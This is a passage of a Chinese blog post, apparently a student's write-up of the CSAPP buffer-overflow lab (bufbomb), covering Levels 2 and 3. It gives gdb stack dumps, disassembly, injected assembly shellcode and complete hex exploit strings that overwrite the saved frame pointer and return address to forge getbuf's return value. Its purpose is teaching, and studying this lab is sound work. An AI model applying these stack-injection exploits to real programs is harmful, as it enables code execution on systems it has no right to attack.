0xffffba40   ⏩\n\n(gdb) p /x $ebp\n$2 = 0xffffba58   ▶\n\n(gdb) x/64xb $esp\n0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44\n0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c😉\n0xffffba58:▶  0xff    0xff    0xff    0xff    ❤0x60    0xba    0xff    0xff❤\n0xffffba60:   ☢0xc7    0x04    0x25    0xdc    0xa1    0x04    0x08    0x15\n0xffffba68:     0x85    0xc9    0x2a    0xc7    0x04    0x24    0x60    0x8d\n0xffffba70:     0x04    0x08    0xc3☢    0x00    0xef    0xbe    0xad    0xde\n0xffffba78:     0x98    0xcc    0xff    0xff    0x05    0x91    0x04    0x08\n```\n\n上面内容是不是很熟悉，在 Level0 中出现过。😀😉标记就是程序分配的 12 个字节缓冲区，❤标记的是跳转到的目标地址。☢标记的是注入的指令。\n\n因此❤中应填写：`0xffffba60` 对应的小端编码。\n\n程序结果为：\n\n```\nType string:Bang!: You set global_value to 0x2ac98515\n```\n\n\n## Level 3 - 炸药【选做】\n\n> 本层为综合发散考察。\n\n关于本层的提示，在上面 3 层的答案中，我们用 `ff ff ff ff` 把 `%ebp` 的值覆盖掉了。但这一层不太一样，它会检测 `%ebp` 的值是否改动。\n\n首先给出了完整的 test 函数：\n\n```c\nvoid test() \n{ \n\tint val; \n\tvolatile int local = 0xdeadbeef; \n\tentry_check(3); /* Make sure entered this function properly */ \n\tval = getbuf(); \n\t/* Check for corrupted stack */ \n\tif (local != 0xdeadbeef) { \n\t\tprintf(\"Sabotaged!: the stack has been corrupted\\n\"); \n\t} \n\telse if (val == cookie) { \n\t\tprintf(\"Boom!: getbuf returned 0x%x\\n\", val);   // 我们需要进入到这里\n\t\tvalidate(3); \n\t} \n\telse { \n\t\tprintf(\"Dud: getbuf returned 0x%x\\n\", val); \n\t} \n}\n```\n\n要点：\n\n1. `val` 是 `getbuf()` 的返回值，我们需要修改这个返回值为我们的 cookie\n2. 保证程序在取 `local` 时能正确取到魔数 `0xdeadbeef`\n\n观察 test 汇编代码：\n\n```d\n08049000 <test>:\n 8049000:\t55                   \tpush   %ebp\n 8049001:\t89 e5                \tmov    %esp,%ebp\n 8049003:\t83 ec 18             \tsub    $0x18,%esp\n 8049006:\tc7 45 fc ef be ad de \tmovl   $0xdeadbeef,-0x4(%ebp) ; %ebp: 0xffffba78\n 804900d:\tc7 04 24 03 00 00 00 \tmovl   $0x3,(%esp)\n 8049014:\te8 87 f9 ff ff       \tcall   80489a0 <entry_check>\n 8049019:\te8 c2 ff ff ff       \tcall   8048fe0 <getbuf>\n 804901e:\t89 c2                \tmov    %eax,%edx        # %edx 存储 getbuf 返回值\n 8049020:\t8b 45 fc             \tmov    -0x4(%ebp),%eax  # local = -0x4(%ebp)\n 8049023:\t3d ef be ad de       \tcmp    $0xdeadbeef,%eax\n 8049028:\t74 0e                \tje     8049038 <test+0x38> # 必须相等\n 804902a:\tc7 04 24 b8 98 04 08 \tmovl   $0x80498b8,(%esp)\n;  (gdb) p (char*) 0x80498b8\n; $10 = 0x80498b8 \"Sabotaged!: the stack has been corrupted\"\n 8049031:\te8 de f6 ff ff       \tcall   8048714 <puts@plt>\n 8049036:\tc9                   \tleave  \n 8049037:\tc3                   \tret    \n 8049038:\t3b 15 cc a1 04 08    \tcmp    0x804a1cc,%edx #  0x804a1cc 存储的是cookie字符串 0x2ac98515 对应我的学号\n 804903e:\t74 12                \tje     8049052 <test+0x52>  # 必须相等\n 8049040:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n 8049044:\tc7 04 24 9b 9a 04 08 \tmovl   $0x8049a9b,(%esp)\n;  (gdb) p (char*) 0x8049a9b\n; $11 = 0x8049a9b \"Dud: getbuf returned 0x%x\\n\"\n 804904b:\te8 14 f7 ff ff       \tcall   8048764 <printf@plt>\n 8049050:\tc9                   \tleave  \n 8049051:\tc3                   \tret    \n 8049052:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n 8049056:\tc7 04 24 7e 9a 04 08 \tmovl   $0x8049a7e,(%esp) #  <- 目标字符串\n;  (gdb) p (char*) 0x8049a7e\n; $12 = 0x8049a7e \"Boom!: getbuf returned 0x%x\\n\"\n 804905d:\te8 02 f7 ff ff       \tcall   8048764 <printf@plt>\n 8049062:\tc7 04 24 03 00 00 00 \tmovl   $0x3,(%esp)\n 8049069:\te8 72 fa ff ff       \tcall   8048ae0 <validate>\n 804906e:\tc9                   \tleave  \n 804906f:\tc3                   \tret \n```\n\n代码观察：\n\n- 地址 `8049006`：观察到，`$0xdeadbeef` 存储在 `-0x4(%ebp)`，此时对应的 `%ebp` 为: `0xffffba78`，也就是 `$0xdeadbeef` 存储在 `0xffffba74`。\n- 地址 `804901e`：`%edx` 存储 `getbuf` 返回值\n- 地址 `8049020` 到 `8049028`：将 `-0x4(%ebp)` 取出来和 `$0xdeadbeef` 比较。\n- 地址 `8049038` 到 `804903e`：比较 `getbuf` 返回值和 cookie 是否相等\n\n我们都知道函数执行结果一般放在 `%eax`，`getbuf` 函数也是一样，我们注入的指令，应该要修改 `%eax` 为我们的 cookie，在 `getbuf` 压入 test 函数调用时正常返回的位置 `0x804901e`。在返回到 test 时会使用 `%ebp`，我们的注入代码不应该动这个值。\n\n### 方案 1：覆盖正确的 `%ebp`\n\n编写的 `level3.s` 为：\n\n```\nmovl $0x2ac98515,%eax\nmovl $0x804901e,(%rsp)\nret\n```\n\n得到的反汇编文件：\n\n```d\nlevel3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tb8 15 85 c9 2a       \tmov    $0x2ac98515,%eax\n   5:\tc7 04 24 1e 90 04 08 \tmovl   $0x804901e,(%rsp)\n   c:\tc3                   \tretq   \n\n```\n\n编写指令做两件事：\n\n1. 修改 `getbuf` 的返回值\n2. 跳转到 `test` 正确的位置\n\n答案：\n\n```\n# 答案 1 \n41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹78 ba ff ff🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 c3☢\n```\n\n❤标记了指令执行地址，☢标记了注入的指令，🔹标记了覆盖的 `%ebp`：`0xffffba78`\n\n## 方案 2：指令修改为正确的 `%ebp`\n\n另外一种答案为在指令中修改正确的 `%ebp` 的值也是可以的，两者实现的效果是一样的。\n\n编写的 `level3.s` 为：\n\n```d\nmovl $0x2ac98515,%eax\nmovl $0x804901e,(%rsp)\nmovl $0xffffba78,%ebp\nret\n```\n\n反汇编结果：\n\n```d\n\nlevel3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tb8 15 85 c9 2a       \tmov    $0x2ac98515,%eax\n   5:\tc7 04 24 1e 90 04 08 \tmovl   $0x804901e,(%rsp)\n   c:\tbd 78 ba ff ff       \tmov    $0xffffba78,%ebp\n  11:\tc3                   \tretq   \n\n```\n\n答案文件 `exploit3.txt` 为：\n\n```\n# 答案 2 。其中 zz zz zz zz 为任意十六进制数\n41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹zz zz zz zz🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 ◾bd 78 ba ff ff◾ c3☢\n```\n\n◾标记了新增的指令。\n\n最终 `bufbomb` 程序结果为：\n\n```\nType string:Boom!: getbuf returned 0x2ac98515\n```\n# 本文参考\n-  [gdb中看内存(x命令)_gdb 查看内存x-CSDN博客](https://blog.csdn.net/yasi_xi/article/details/9263955)\n- [修改程序堆栈的可执行属性-CSDN博客](https://blog.csdn.net/a523442148/article/details/101253155)\n- [CSAPP课程Lab3 attack - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/629686088)\n","categories":[{"name":"CSAPP LABS","api":"api/categories/CSAPP-LABS.json"}],"tags":[{"name":"CSAPP","api":"api/tags/CSAPP.json"},{"name":"ASM","api":"api/tags/ASM.json"},{"name":"C","api":"api/tags/C.json"},{"name":"GDB","api":"api/tags/GDB.json"},{"name":"objdump","api":"api/tags/objdump.json"}]},"api":"api/posts/p/67787353.json"}